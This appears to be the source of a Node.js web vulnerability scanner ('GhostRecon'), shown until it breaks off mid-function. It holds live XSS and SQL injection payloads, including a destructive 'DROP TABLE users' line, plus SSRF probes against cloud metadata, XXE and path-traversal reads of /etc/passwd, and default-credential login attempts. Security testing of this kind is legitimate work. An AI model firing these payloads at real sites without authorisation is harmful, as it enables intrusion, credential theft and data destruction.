const axios = require("axios");
const cheerio = require("cheerio");

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  '"><img src=x onerror=alert(1)>',
  "<svg onload=alert(1)>",
  "javascript:alert(1)",
  '"><svg onload=alert(1)>',
  "<body onload=alert(1)>",
  "{{7*7}}",
  "${7*7}",
  "<script>document.write(7*7)</script>",
  '"><details open ontoggle=alert(1)>',
  "<input autofocus onfocus=alert(1)>",
  '"-alert(1)-"',
  "'-alert(1)-'",
  "<iframe src=javascript:alert(1)>",
];

const SQLI_PAYLOADS = [
  "'",
  "''",
  "` ",
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR 1=1--",
  '" OR "1"="1',
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
  "1 UNION SELECT null--",
  "' UNION SELECT null,null--",
  "1; DROP TABLE users--",
  "' OR SLEEP(3)--",
];

const BLIND_SQLI_PAYLOADS = [
  { payload: "1' AND SLEEP(4)--", delay: 4000, db: "MySQL" },
  { payload: "1; WAITFOR DELAY '0:0:4'--", delay: 4000, db: "MSSQL" },
  { payload: "1' AND pg_sleep(4)--", delay: 4000, db: "PostgreSQL" },
  { payload: "1 AND SLEEP(4)", delay: 4000, db: "MySQL" },
  { payload: "' OR SLEEP(4)--", delay: 4000, db: "MySQL" },
];

const SQL_ERRORS = [
  "you have an error in your sql syntax",
  "warning: mysql",
  "unclosed quotation mark",
  "quoted string not properly terminated",
  "pg::syntaxerror",
  "sqlite3::",
  "ora-00933",
  "microsoft ole db provider for sql server",
  "odbc sql server driver",
  "mysql_fetch",
  "num_rows",
  "mysql error",
  "supplied argument is not a valid mysql",
  "on mysql result",
  "mysqlclient",
  "sql syntax",
  "syntax error",
  "database error",
];

const WAF_SIGNATURES = [
  {
    name: "Cloudflare",
    headers: ["cf-ray", "cf-cache-status"],
    cookies: ["__cfduid", "cf_clearance"],
  },
  {
    name: "AWS WAF",
    headers: ["x-amzn-requestid", "x-amz-cf-id"],
    cookies: [],
  },
  {
    name: "Akamai",
    headers: ["x-akamai-transformed", "akamai-origin-hop"],
    cookies: ["ak_bmsc"],
  },
  {
    name: "Incapsula",
    headers: ["x-iinfo", "x-cdn"],
    cookies: ["visid_incap", "incap_ses"],
  },
  { name: "Sucuri", headers: ["x-sucuri-id", "x-sucuri-cache"], cookies: [] },
  {
    name: "ModSecurity",
    headers: ["mod_security", "x-modsecurity"],
    cookies: [],
  },
  {
    name: "F5 BIG-IP",
    headers: ["x-wa-info", "x-cnection"],
    cookies: ["BIGipServer"],
  },
];

const CMS_SIGNATURES = [
  {
    name: "WordPress",
    paths: ["/wp-login.php", "/wp-admin/"],
    meta: ["wordpress"],
  },
  { name: "Joomla", paths: ["/administrator/"], meta: ["joomla"] },
  { name: "Drupal", paths: ["/user/login"], meta: ["drupal"] },
  { name: "Magento", paths: ["/admin/"], meta: [] },
  { name: "Shopify", paths: [], meta: ["shopify"] },
  { name: "Laravel", paths: ["/login"], meta: [] },
];

const axiosInstance = axios.create({
  timeout: 30000,
  validateStatus: () => true,
  headers: {
    "User-Agent": "Mozilla/5.0 (compatible; GhostRecon Security Scanner)",
    Accept: "text/html,application/xhtml+xml,*/*",
  },
  maxRedirects: 3,
});

// ── Page Crawler ──────────────────────────────────────
async function crawlPage(targetUrl, baseUrl, visited = new Set()) {
  if (visited.has(targetUrl) || visited.size > 20)
    return { links: [], forms: [], html: "", headers: {} };
  visited.add(targetUrl);

  try {
    const response = await axiosInstance.get(targetUrl);
    const $ = cheerio.load(response.data);
    const links = [];
    const forms = [];

    $("a[href]").each((i, el) => {
      const href = $(el).attr("href");
      if (!href) return;
      try {
        const absolute = new URL(href, baseUrl).href;
        if (absolute.startsWith(baseUrl) && !visited.has(absolute)) {
          links.push(absolute);
        }
      } catch (e) {}
    });

    $("form").each((i, form) => {
      const action = $(form).attr("action") || targetUrl;
      const method = ($(form).attr("method") || "get").toLowerCase();
      const inputs = [];

      $(form)
        .find("input, textarea, select")
        .each((j, input) => {
          const name = $(input).attr("name");
          const type = $(input).attr("type") || "text";
          const value = $(input).attr("value") || "test";
          if (
            name &&
            type !== "submit" &&
            type !== "hidden" &&
            type !== "file"
          ) {
            inputs.push({ name, type, value });
          }
        });

      if (inputs.length > 0) {
        try {
          forms.push({
            action: new URL(action, baseUrl).href,
            method,
            inputs,
            pageUrl: targetUrl,
          });
        } catch (e) {}
      }
    });

    const parsedUrl = new URL(targetUrl);
    if (parsedUrl.search) {
      const params = [];
      parsedUrl.searchParams.forEach((value, name) =>
        params.push({ name, value }),
      );
      if (params.length > 0) {
        forms.push({
          action: targetUrl,
          method: "get",
          inputs: params,
          pageUrl: targetUrl,
          isUrlParam: true,
        });
      }
    }

    return {
      links,
      forms,
      html: typeof response.data === "string" ? response.data : "",
      headers: response.headers,
    };
  } catch (e) {
    return { links: [], forms: [], html: "", headers: {} };
  }
}

// ── Security Headers ──────────────────────────────────
function checkSecurityHeaders(headers) {
  const findings = [];
  const checks = [
    {
      header: "content-security-policy",
      severity: "High",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: "Missing CSP makes XSS attacks much easier.",
      remediation: "Add: Content-Security-Policy: default-src 'self'",
    },
    {
      header: "strict-transport-security",
      severity: "High",
      owasp: "A02:2021 - Cryptographic Failures",
      detail: "Missing HSTS allows HTTP downgrade attacks.",
      remediation:
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    },
    {
      header: "x-frame-options",
      severity: "Medium",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: "Missing X-Frame-Options allows clickjacking.",
      remediation: "Add: X-Frame-Options: DENY",
    },
    {
      header: "x-content-type-options",
      severity: "Low",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: "Missing X-Content-Type-Options allows MIME sniffing.",
      remediation: "Add: X-Content-Type-Options: nosniff",
    },
    {
      header: "referrer-policy",
      severity: "Low",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: "Missing Referrer-Policy leaks URLs.",
      remediation: "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
    {
      header: "permissions-policy",
      severity: "Low",
      owasp: "A05:2021 - Security Misconfiguration",
      detail:
        "Missing Permissions-Policy allows unrestricted browser features.",
      remediation: "Add: Permissions-Policy: camera=(), microphone=()",
    },
  ];
  checks.forEach((c) => {
    if (!headers[c.header]) {
      findings.push({
        type: `Missing Security Header: ${c.header}`,
        severity: c.severity,
        owasp: c.owasp,
        detail: c.detail,
        evidence: `Header "${c.header}" not present`,
        remediation: c.remediation,
      });
    }
  });
  if (headers["server"] && /[\d.]+/.test(headers["server"])) {
    findings.push({
      type: "Server Version Disclosed",
      severity: "Low",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: `Server reveals version: "${headers["server"]}"`,
      evidence: `Server: ${headers["server"]}`,
      remediation: "Hide server version in config.",
    });
  }
  if (headers["x-powered-by"]) {
    findings.push({
      type: "Technology Stack Disclosed",
      severity: "Low",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: `X-Powered-By: "${headers["x-powered-by"]}"`,
      evidence: `X-Powered-By: ${headers["x-powered-by"]}`,
      remediation: "Remove X-Powered-By header.",
    });
  }
  return findings;
}

// ── Cookie Security ───────────────────────────────────
function checkCookies(headers) {
  const findings = [];
  const setCookie = headers["set-cookie"];
  if (!setCookie) return findings;
  const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
  cookies.forEach((cookie) => {
    const name = cookie.split("=")[0].trim();
    if (!cookie.toLowerCase().includes("httponly")) {
      findings.push({
        type: "Cookie Missing HttpOnly",
        severity: "Medium",
        owasp: "A02:2021 - Cryptographic Failures",
        detail: `Cookie "${name}" missing HttpOnly — JS can steal it via XSS.`,
        evidence: `Set-Cookie: ${cookie.substring(0, 80)}`,
        remediation: `Add HttpOnly to ${name} cookie.`,
      });
    }
    if (!cookie.toLowerCase().includes("secure")) {
      findings.push({
        type: "Cookie Missing Secure Flag",
        severity: "Medium",
        owasp: "A02:2021 - Cryptographic Failures",
        detail: `Cookie "${name}" missing Secure — sent over HTTP.`,
        evidence: `Set-Cookie: ${cookie.substring(0, 80)}`,
        remediation: `Add Secure to ${name} cookie.`,
      });
    }
    if (!cookie.toLowerCase().includes("samesite")) {
      findings.push({
        type: "Cookie Missing SameSite",
        severity: "Low",
        owasp: "A01:2021 - Broken Access Control",
        detail: `Cookie "${name}" missing SameSite — CSRF risk.`,
        evidence: `Set-Cookie: ${cookie.substring(0, 80)}`,
        remediation: `Add SameSite=Strict to ${name} cookie.`,
      });
    }
  });
  return findings;
}

// ── Clickjacking ──────────────────────────────────────
function checkClickjacking(headers) {
  const findings = [];
  const xfo = headers["x-frame-options"];
  const csp = headers["content-security-policy"];
  if (!xfo && !(csp && csp.includes("frame-ancestors"))) {
    findings.push({
      type: "Clickjacking Vulnerability",
      severity: "Medium",
      owasp: "A05:2021 - Security Misconfiguration",
      detail:
        "Page can be embedded in iframes. Attackers trick users into clicking malicious elements.",
      evidence: "No X-Frame-Options or CSP frame-ancestors found",
      remediation: "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'",
    });
  }
  return findings;
}

// ── CORS Check ────────────────────────────────────────
async function checkCORS(targetUrl) {
  const findings = [];
  try {
    const response = await axiosInstance.get(targetUrl, {
      headers: { Origin: "https://evil.com" },
    });
    const acao = response.headers["access-control-allow-origin"];
    const acac = response.headers["access-control-allow-credentials"];
    if (acao === "*") {
      findings.push({
        type: "CORS Wildcard Origin",
        severity: "Medium",
        owasp: "A01:2021 - Broken Access Control",
        detail:
          "CORS wildcard allows any website to make cross-origin requests.",
        evidence: "Access-Control-Allow-Origin: *",
        remediation: "Restrict CORS to specific trusted origins.",
      });
    }
    if (acao === "https://evil.com") {
      findings.push({
        type:
          acac === "true"
            ? "CORS Misconfiguration with Credentials"
            : "CORS Origin Reflection",
        severity: acac === "true" ? "Critical" : "High",
        owasp: "A01:2021 - Broken Access Control",
        detail:
          acac === "true"
            ? "Server reflects attacker origin with credentials — full account takeover possible."
            : "Server reflects attacker-controlled Origin.",
        evidence: `ACAO: ${acao}, ACAC: ${acac}`,
        remediation: "Validate Origin against strict whitelist.",
      });
    }
  } catch (e) {}
  return findings;
}

// ── WAF Detection ─────────────────────────────────────
async function detectWAF(targetUrl, headers) {
  const findings = [];
  const detectedWAFs = [];
  for (const waf of WAF_SIGNATURES) {
    let detected = waf.headers.some((h) => headers[h]);
    if (!detected) {
      const cookieHeader = (headers["set-cookie"] || "").toString();
      detected = waf.cookies.some((c) => cookieHeader.includes(c));
    }
    if (detected) detectedWAFs.push(waf.name);
  }
  if (detectedWAFs.length > 0) {
    findings.push({
      type: "WAF Detected",
      severity: "Info",
      owasp: "A05:2021 - Security Misconfiguration",
      detail: `WAF detected: ${detectedWAFs.join(", ")}. Good protection layer but should not be sole defense.`,
      evidence: `WAF signatures: ${detectedWAFs.join(", ")}`,
      remediation: "Keep WAF rules updated.",
    });
  } else {
    findings.push({
      type: "No WAF Detected",
      severity: "Medium",
      owasp: "A05:2021 - Security Misconfiguration",
      detail:
        "No Web Application Firewall detected. No automated protection against web attacks.",
      evidence: "No WAF signatures found",
      remediation: "Consider Cloudflare (free), AWS WAF, or ModSecurity.",
    });
  }
  return { findings, detectedWAFs };
}

// ── CMS Detection ─────────────────────────────────────
async function detectCMS(targetUrl, html, headers) {
  const findings = [];
  const detectedCMS = [];
  const $ = cheerio.load(html);
  for (const cms of CMS_SIGNATURES) {
    let detected = false;
    const generator = $('meta[name="generator"]').attr("content") || "";
    if (generator.toLowerCase().includes(cms.name.toLowerCase()))
      detected = true;
    if (!detected)
      detected = cms.meta.some((m) => html.toLowerCase().includes(m));
    if (!detected) {
      for (const path of cms.paths) {
        try {
          const res = await axiosInstance.get(new URL(path, targetUrl).href);
          if (res.status === 200 || res.status === 302) {
            detected = true;
            break;
          }
        } catch (e) {}
      }
    }
    if (detected) detectedCMS.push(cms.name);
  }
  if (detectedCMS.length > 0) {
    const cms = detectedCMS[0];
    findings.push({
      type: `CMS Detected: ${cms}`,
      severity: "Low",
      owasp: "A06:2021 - Vulnerable Components",
      detail: `${cms} detected. Attackers target known ${cms} vulnerabilities and outdated plugins.`,
      evidence: `${cms} signatures found`,
      remediation: `Keep ${cms} and all plugins updated. Harden configuration.`,
    });
    if (cms === "WordPress") {
      findings.push({
        type: "WordPress — Audit Plugins",
        severity: "Medium",
        owasp: "A06:2021 - Vulnerable Components",
        detail: "Over 90% of WordPress hacks are through vulnerable plugins.",
        evidence: "WordPress detected",
        remediation: "Use WPScan to audit plugins. Enable auto-updates.",
      });
    }
  }
  return { findings, detectedCMS };
}

// ── DOM XSS ───────────────────────────────────────────
function checkDOMXSS(html) {
  const findings = [];
  const sinks = [
    { pattern: /document\.write\s*\(/gi, name: "document.write()" },
    { pattern: /innerHTML\s*=/gi, name: "innerHTML" },
    { pattern: /outerHTML\s*=/gi, name: "outerHTML" },
    { pattern: /eval\s*\(/gi, name: "eval()" },
    { pattern: /setTimeout\s*\(\s*['"]/gi, name: "setTimeout(string)" },
    { pattern: /location\.href\s*=/gi, name: "location.href" },
  ];
  const sources = [
    /document\.URL/gi,
    /location\.search/gi,
    /location\.hash/gi,
    /document\.referrer/gi,
    /window\.name/gi,
  ];
  const sinkFound = sinks.find((s) => s.pattern.test(html));
  const sourceFound = sources.find((s) => s.test(html));
  if (sinkFound && sourceFound) {
    findings.push({
      type: "DOM-Based XSS (Potential)",
      severity: "High",
      owasp: "A03:2021 - Injection",
      detail: `Dangerous DOM sink "${sinkFound.name}" and user-controllable source detected. DOM XSS possible if data flows between them.`,
      evidence: `Sink: ${sinkFound.name} | Source: ${sourceFound.toString().replace(/\//g, "").replace(/gi/g, "")}`,
      remediation:
        "Use textContent instead of innerHTML. Sanitize with DOMPurify.",
    });
  } else if (sinkFound) {
    findings.push({
      type: "Dangerous DOM Sink",
      severity: "Medium",
      owasp: "A03:2021 - Injection",
      detail: `Dangerous sink "${sinkFound.name}" found. Could lead to DOM XSS if combined with user input.`,
      evidence: `Sink: ${sinkFound.name}`,
      remediation: "Review all uses of this sink and sanitize inputs.",
    });
  }
  return findings;
}

// ── CSRF Detection ────────────────────────────────────
function checkCSRF(forms) {
  const findings = [];
  forms
    .filter((f) => f.method === "post")
    .forEach((form) => {
      const hasToken = form.inputs.some((i) => {
        const n = i.name.toLowerCase();
        return n.includes("csrf") || n.includes("token") || n.includes("nonce");
      });
      if (!hasToken) {
        findings.push({
          type: "CSRF Token Missing",
          severity: "High",
          owasp: "A01:2021 - Broken Access Control",
          detail: `POST form at "${form.action}" has no CSRF token. Attackers can trick users into submitting this form.`,
          evidence: `POST ${form.action} — fields: ${form.inputs.map((i) => i.name).join(", ")}`,
          endpoint: form.action,
          method: "POST",
          remediation:
            "Add CSRF token to every POST form. Use framework CSRF protection.",
        });
      }
    });
  return findings;
}

// ── SSRF ──────────────────────────────────────────────
async function testSSRF(targetUrl, forms) {
  const findings = [];
  const ssrfPayloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://localhost/",
  ];
  const ssrfParams = [
    "url",
    "uri",
    "path",
    "dest",
    "redirect",
    "proxy",
    "fetch",
    "link",
    "src",
    "source",
    "file",
    "load",
    "image",
    "img",
  ];
  for (const form of forms.slice(0, 5)) {
    for (const input of form.inputs) {
      if (!ssrfParams.some((p) => input.name.toLowerCase().includes(p)))
        continue;
      for (const payload of ssrfPayloads) {
        try {
          const formData = {};
          form.inputs.forEach((i) => {
            formData[i.name] = i.name === input.name ? payload : i.value;
          });
          let response;
          if (form.method === "post") {
            response = await axiosInstance.post(form.action, formData);
          } else {
            const testUrl = new URL(form.action);
            testUrl.searchParams.set(input.name, payload);
            response = await axiosInstance.get(testUrl.href);
          }
          const body =
            typeof response.data === "string"
              ? response.data
              : JSON.stringify(response.data);
          if (
            body.includes("ami-id") ||
            body.includes("instance-id") ||
            body.includes("root:x:0:0")
          ) {
            findings.push({
              type: "Server-Side Request Forgery (SSRF)",
              severity: "Critical",
              owasp: "A10:2021 - Server-Side Request Forgery",
              parameter: input.name,
              endpoint: form.action,
              method: form.method.toUpperCase(),
              payload,
              detail:
                "SSRF confirmed. Attacker can access internal services and AWS metadata.",
              evidence: `"${input.name}" with "${payload}" returned internal data`,
              remediation: "Whitelist allowed URLs. Block private IP ranges.",
            });
            return findings;
          }
        } catch (e) {}
      }
    }
  }
  return findings;
}

// ── Directory Traversal / LFI ─────────────────────────
async function testDirectoryTraversal(forms) {
  const findings = [];
  const payloads = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  ];
  const fileParams = [
    "file",
    "path",
    "page",
    "include",
    "doc",
    "template",
    "view",
    "content",
    "load",
    "read",
  ];
  for (const form of forms.slice(0, 5)) {
    for (const input of form.inputs) {
      if (!fileParams.some((p) => input.name.toLowerCase().includes(p)))
        continue;
      for (const payload of payloads) {
        try {
          const formData = {};
          form.inputs.forEach((i) => {
            formData[i.name] = i.name === input.name ? payload : i.value;
          });
          let response;
          if (form.method === "post") {
            response = await axiosInstance.post(form.action, formData);
          } else {
            const testUrl = new URL(form.action);
            testUrl.searchParams.set(input.name, payload);
            response = await axiosInstance.get(testUrl.href);
          }
          const body =
            typeof response.data === "string"
              ? response.data
              : JSON.stringify(response.data);
          if (
            body.includes("root:x:0:0") ||
            body.includes("[extensions]") ||
            body.includes("daemon:")
          ) {
            findings.push({
              type: "Directory Traversal / LFI",
              severity: "Critical",
              owasp: "A01:2021 - Broken Access Control",
              parameter: input.name,
              endpoint: form.action,
              method: form.method.toUpperCase(),
              payload,
              detail:
                "LFI confirmed. Attacker can read server files including passwords and configs.",
              evidence: `"${input.name}" with "${payload}" returned file contents`,
              remediation:
                "Never use user input in file paths. Whitelist allowed files.",
            });
            return findings;
          }
        } catch (e) {}
      }
    }
  }
  return findings;
}

// ── Broken Auth ───────────────────────────────────────
async function checkBrokenAuth(forms) {
  const findings = [];
  const loginForms = forms.filter((form) => {
    const fields = form.inputs.map((i) => i.name.toLowerCase()).join(" ");
    return (
      fields.includes("password") ||
      fields.includes("pass") ||
      fields.includes("pwd")
    );
  });
  for (const form of loginForms) {
    try {
      const userField = form.inputs.find((i) =>
        ["user", "email", "login", "username"].some((k) =>
          i.name.toLowerCase().includes(k),
        ),
      );
      const passField = form.inputs.find((i) =>
        ["pass", "pwd", "password"].some((k) =>
          i.name.toLowerCase().includes(k),
        ),
      );
      if (!userField || !passField) continue;

      const weakCreds = [
        { user: "admin", pass: "admin" },
        { user: "admin", pass: "password" },
        { user: "admin", pass: "123456" },
        { user: "root", pass: "root" },
      ];
      for (const cred of weakCreds) {
        const formData = {};
        form.inputs.forEach((i) => {
          formData[i.name] = "x";
        });
        formData[userField.name] = cred.user;
        formData[passField.name] = cred.pass;
        const response = await axiosInstance.post(form.action, formData);
        const body = (
          typeof response.data === "string" ? response.data : ""
        ).toLowerCase();
        if (
          response.status === 302 ||
          body.includes("dashboard") ||
          body.includes("welcome") ||
          body.includes("logout")
        ) {
          findings.push({
            type: "Weak/Default Credentials",
            severity: "Critical",
            owasp: "A07:2021 - Identification and Authentication Failures",
            endpoint: form.action,
            method: "POST",
            detail: `Login succeeded with "${cred.user}/${cred.pass}". Direct access to application.`,
            evidence: `POST ${form.action} with ${cred.user}/${cred.pass} → HTTP ${response.status}`,
            remediation:
              "Change default passwords. Enforce strong password policy. Enable MFA.",
          });
          break;
        }
      }

      let noRateLimit = true;
      for (let i = 0; i < 6; i++) {
        const formData = {};
        form.inputs.forEach((inp) => {
          formData[inp.name] = "x";
        });
        formData[userField.name] = "admin";
        formData[passField.name] = `wrongpass${i}`;
        const r = await axiosInstance.post(form.action, formData);
        if (r.status === 429 || r.status === 403) {
          noRateLimit = false;
          break;
        }
      }
      if (noRateLimit) {
        findings.push({
          type: "No Login Rate Limiting",
          severity: "High",
          owasp: "A07:2021 - Identification and Authentication Failures",
          endpoint: form.action,
          method: "POST",
          detail:
            "Login form has no rate limiting. Unlimited brute force attempts possible.",
          evidence: `6 failed attempts returned no 429/403 on ${form.action}`,
          remediation: "Add rate limiting. Lock after 5 attempts. Add CAPTCHA.",
        });
      }
    } catch (e) {}
  }
  return findings;
}

// ── JWT Check ─────────────────────────────────────────
async function checkJWT(headers) {
  const findings = [];
  const jwtRegex = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/;
  const authHeader = headers["authorization"] || "";
  const cookies = Array.isArray(headers["set-cookie"])
    ? headers["set-cookie"].join(" ")
    : headers["set-cookie"] || "";
  let token = null;
  const m1 = authHeader.match(jwtRegex);
  const m2 = cookies.match(jwtRegex);
  if (m1) token = m1[0];
  else if (m2) token = m2[0];
  if (!token) return findings;
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return findings;
    const header = JSON.parse(Buffer.from(parts[0], "base64").toString());
    const payload = JSON.parse(Buffer.from(parts[1], "base64").toString());
    if (header.alg === "none" || header.alg === "NONE") {
      findings.push({
        type: "JWT None Algorithm",
        severity: "Critical",
        owasp: "A02:2021 - Cryptographic Failures",
        detail:
          'JWT uses "none" algorithm. Attacker can forge tokens and bypass authentication.',
        evidence: `alg: ${header.alg}`,
        remediation:
          "Reject JWTs with none algorithm. Always verify signatures.",
      });
    }
    if (header.alg === "HS256") {
      findings.push({
        type: "JWT Weak Algorithm (HS256)",
        severity: "Medium",
        owasp: "A02:2021 - Cryptographic Failures",
        detail:
          "HS256 is symmetric. If secret is weak, tokens can be brute-forced.",
        evidence: `alg: HS256`,
        remediation: "Upgrade to RS256. Use 256+ bit random secret.",
      });
    }
    if (!payload.exp) {
      findings.push({
        type: "JWT No Expiry",
        severity: "High",
        owasp: "A02:2021 - Cryptographic Failures",
        detail: "JWT has no expiry. Stolen tokens are valid forever.",
        evidence: "No exp claim",
        remediation: "Set short expiry (15-60 min). Use refresh tokens.",
      });
    } else {
      const days = Math.floor(
        (new Date(payload.exp * 1000) - new Date()) / 86400000,
      );
      if (days > 30) {
        findings.push({
          type: "JWT Long Expiry",
          severity: "Low",
          owasp: "A02:2021 - Cryptographic Failures",
          detail: `JWT expires in ${days} days. Long-lived tokens increase theft risk.`,
          evidence: `Expires in ${days} days`,
          remediation: "Use shorter expiry. Implement refresh token rotation.",
        });
      }
    }
  } catch (e) {}
  return findings;
}

// ── XXE ───────────────────────────────────────────────
async function testXXE(targetUrl) {
  const findings = [];
  const xxePayload = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>`;
  try {
    const response = await axiosInstance.post(targetUrl, xxePayload, {
      headers: { "Content-Type": "application/xml" },
      timeout: 10000,
    });
    const body =
      typeof response.data === "string"
        ? response.data
        : JSON.stringify(response.data);
    if (
      body.includes("root:") ||
      body.includes("daemon:") ||
      body.includes("/bin/bash")
    ) {
      findings.push({
        type: "XML External Entity (XXE)",
        severity: "Critical",
        owasp: "A05:2021 - Security Misconfiguration",
        detail:
          "XXE confirmed. Server reads local files via XML entity injection.",
        evidence: "Server returned /etc/passwd contents",
        remediation:
          "Disable external entity processing. Use safe XML parsers.",
      });
    }
  } catch (e) {}
  return findings;
}

// ── Sensitive Files ───────────────────────────────────
async function checkSensitiveFiles(baseUrl) {
  const findings = [];
  const files = [
    { path: "/.git/config", name: "Git repository exposed", critical: true },
    { path: "/.env", name: "Environment file exposed", critical: true },
    {
      path: "/wp-config.php",
      name: "WordPress config exposed",
      critical: true,
    },
    { path: "/config.php", name: "PHP config exposed", critical: true },
    { path: "/phpinfo.php", name: "PHP info exposed", critical: true },
    { path: "/admin", name: "Admin panel exposed", critical: false },
    { path: "/administrator", name: "Admin panel exposed", critical: false },
    { path: "/.htaccess", name: "Apache config exposed", critical: false },
    { path: "/backup.zip", name: "Backup file exposed", critical: true },
    { path: "/database.sql", name: "Database dump exposed", critical: true },
    { path: "/.DS_Store", name: "DS_Store file exposed", critical: false },
    { path: "/web.config", name: "IIS config exposed", critical: true },
    {
      path: "/server-status",
      name: "Apache server status exposed",
      critical: false,
    },
    {
      path: "/.well-known/security.txt",
      name: "Security.txt found",
      critical: false,
    },
  ];
  for (const file of files) {
    try {
      const res = await axiosInstance.get(new URL(file.path, baseUrl).href);
      if (res.status === 200) {
        findings.push({
          type: file.name,
          severity: file.critical ? "Critical" : "Low",
          owasp: "A05:2021 - Security Misconfiguration",
          detail: `${file.name} is publicly accessible. May expose credentials or source code.`,
          evidence: `GET ${file.path} → HTTP 200`,
          remediation: `Restrict access to ${file.path} via server config.`,
        });
      }
    } catch (e) {}
  }
  return findings;
}

// ── Open Redirect ─────────────────────────────────────
async function checkOpenRedirect(targetUrl) {
  const findings = [];
  const params = [
    "redirect",
    "url",
    "next",
    "return",
    "returnUrl",
    "goto",
    "dest",
  ];
  for (const param of params) {
    try {
      const testUrl = new URL(targetUrl);
      testUrl.searchParams.set(param, "https://evil.com");
      const response = await axiosInstance.get(testUrl.href, {
        maxRedirects: 0,
      });
      if (response.status >= 300 && response.status < 400) {
        const location = response.headers["location"] || "";
        if (location.includes("evil.com")) {
          findings.push({
            type: "Open Redirect",
            severity: "Medium",
            owasp: "A01:2021 - Broken Access Control",
            detail: `Open redirect via "${param}". Attackers redirect users to phishing sites.`,
            evidence: `${param}=https://evil.com → Location: ${location}`,
            remediation: "Validate redirects against whitelist.",
          });
          break;
        }
      }
    } catch (e) {}
  }
  return findings;
}

// ── XSS Test ──────────────────────────────────────────
async function testXSS(form) {
  const findings = [];
  for (const payload of XSS_PAYLOADS.slice(0, 8)) {
    try {
      const formData = {};
      form.inputs.forEach((i) => {
        formData[i.name] = payload;
      });
      let response;
      if (form.method === "post") {
        response = await axiosInstance.post(form.action, formData);
      } else {
        const testUrl = new URL(form.action);
        form.inputs.forEach((i) => testUrl.searchParams.set(i.name, payload));
        response = await axiosInstance.get(testUrl.href);
      }
      const body =
        typeof response.data === "string"
          ? response.data
          : JSON.stringify(response.data);
      if (
        body.includes(payload) &&
        !body.includes("&lt;") &&
        !body.includes("&#")
      ) {
        findings.push({
          type: "Cross-Site Scripting (XSS)",
          severity: "High",
          owasp: "A03:2021 - Injection",
          parameter: form.inputs.map((i) => i.name).join(", "),
          endpoint: form.action,
          method: form.method.toUpperCase(),
          payload,
          detail:
            "Reflected XSS confirmed. Attacker can steal cookies and hijack sessions.",
          evidence: `Payload "${payload}" reflected unencoded`,
          remediation: "Encode output. Use CSP. Use framework auto-escaping.",
        });
        break;
      }
    } catch (e) {}
  }
  return findings;
}

// ── SQLi Test ─────────────────────────────────────────
async function testSQLi(form) {
  const findings = [];
  for (const payload of SQLI_PAYLOADS.slice(0, 8)) {
    try {
      const formData = {};
      form.inputs.forEach((i) => {
        formData[i.name] = payload;
      });
      let response;
      if (form.method === "post") {
        response = await axiosInstance.post(form.action, formData);
      } else {
        const testUrl = new URL(form.action);
        form.inputs.forEach((i) => testUrl.searchParams.set(i.name, payload));
        response = await axiosInstance.get(testUrl.href);
      }
      const body = (
        typeof response.data === "string"
          ? response.data
          : JSON.stringify(response.data)
      ).toLowerCase();
      const err = SQL_ERRORS.find((e) => body.includes(e));
      if (err) {
        findings.push({
          type: "SQL Injection",
          severity: "Critical",
          owasp: "A03:2021 - Injection",
          parameter: form.inputs.map((i) => i.name).join(", "),
          endpoint: form.action,
          method: form.method.toUpperCase(),
          payload,
          detail:
            "SQL injection confirmed. Attacker can read, modify or delete entire database.",
          evidence: `SQL error "${err}" triggered by "${payload}"`,
          remediation:
            "Use parameterized queries. Never concatenate user input into SQL.",
        });
        break;
      }
    } catch (e) {}
  }
  return findings;
}

// ── Blind SQLi ────────────────────────────────────────
async function testBlindSQLi(form) {
  const findings = [];
  for (const { payload, delay, db } of BLIND_SQLI_PAYLOADS.slice(0, 3)) {
    try {
      const formData = {};
      form.inputs.forEach((i) => {
        formData[i.name] = payload;
      });
      const start = Date.now();
      if (form.method === "post") {
        await axiosInstance.post(form.action, formData, {
          timeout: delay + 8000,
        });
      } else {
        const testUrl = new URL(form.action);
        form.inputs.forEach((i) => testUrl.searchParams.set(i.name, payload));
        await axiosInstance.get(testUrl.href, { timeout: delay + 8000 });
      }
      const elapsed = Date.now() - start;
      if (elapsed >= delay - 500) {
        findings.push({
          type: "Blind SQL Injection (Time-Based)",
          severity: "Critical",
          owasp: "A03:2021 - Injection",
          parameter: form.inputs.map((i) => i.name).join(", "),
          endpoint: form.action,
          method: form.method.toUpperCase(),
          payload,
          detail: `Time-based blind SQLi on ${db}. Server delayed ${Math.round(elapsed / 1000)}s. Attacker extracts full database silently.`,
          evidence: `Payload caused ${Math.round(elapsed / 1000)}s delay (expected ${delay / 1000}s) — ${db}`,
          remediation:
            "Use parameterized queries immediately. Critical vulnerability.",
        });
        break;
      }
    } catch (e) {
      if (
        e.code === "ECONNABORTED" ||
        (e.message && e.message.includes("timeout"))
      ) {
        findings.push({
          type: "Possible Blind SQLi (Timeout)",
          severity: "High",
          owasp: "A03:2021 - Injection",
          parameter: form.inputs.map((i) => i.name).join(", "),
          endpoint: form.action,
          method: form.method.toUpperCase(),
          payload,
          detail:
            "Request timed out after SQL sleep payload. Possible blind SQLi. Manual verification needed.",
          evidence: `Timeout after "${payload}"`,
          remediation: "Manually verify. Use parameterized queries.",
        });
        break;
      }
    }
  }
  return findings;
}

// ── Main Deep Scan ────────────────────────────────────
async function deepScan(targetUrl) {
  const results = {
    target: targetUrl,
    findings: [],
    pagesScanned: 0,
    formsFound: 0,
    waf: [],
    cms: [],
